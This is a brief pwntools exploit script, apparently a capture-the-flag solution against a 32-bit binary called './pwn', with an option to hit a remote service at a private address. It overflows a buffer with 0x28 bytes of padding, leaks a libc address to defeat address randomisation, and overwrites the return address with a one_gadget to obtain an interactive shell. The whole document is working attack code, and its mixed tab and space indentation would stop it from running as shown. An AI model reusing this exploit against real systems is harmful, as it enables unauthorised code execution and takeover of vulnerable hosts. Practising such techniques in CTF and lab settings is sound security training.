from pwn import *
LOCAL = 1
DEBUG = 0
if DEBUG:
    context.log_level = 'debug'
if LOCAL:
    p = process('./pwn')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('172.29.20.115',9999)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
main = 0x8048595
bss = 0x0804A100
leave = 0x08048561
elf = ELF("./pwn")
system_plt = elf.plt["system"]

def exp():
	payload = "A"*0x28
	pause()
	p.sendline(payload)
	p.recvuntil(p32(0x0804862a))
    	libcbase = u32(p.recv(4))-0x1b23dc
    	print("[+] libcbase = " + str(hex(libcbase)))
	one_gadget = libcbase + 0x3ac5c
	payload = "A"*0x28 + p32(0) + p32(one_gadget)
	p.sendline(payload)


exp()
p.interactive()
